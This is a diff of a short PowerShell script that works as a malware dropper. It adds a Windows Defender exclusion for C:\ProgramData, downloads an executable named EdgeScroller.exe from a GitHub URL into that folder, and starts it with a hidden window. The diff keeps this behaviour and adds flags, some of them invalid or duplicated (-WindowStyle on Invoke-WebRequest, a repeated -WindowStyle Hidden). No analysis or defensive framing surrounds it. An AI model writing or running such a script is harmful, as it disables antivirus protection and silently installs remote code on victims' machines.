@@ -1,9 +1,8 @@
-powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData'"
+Add-MpPreference -ExclusionPath 'C:\ProgramData'
 
 $url1 = 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/EdgeScroller.exe'
-
 $location1 = 'C:\ProgramData\EdgeScroller.exe'
 
-Invoke-WebRequest -Uri $url1 -OutFile $location1
+Invoke-WebRequest -Uri $url1 -OutFile $location1 -UseBasicParsing -WindowStyle Hidden
 
-Start-Process -FilePath $location1 -WindowStyle Hidden
+Start-Process -FilePath $location1 -WindowStyle Hidden -WindowStyle Hidden
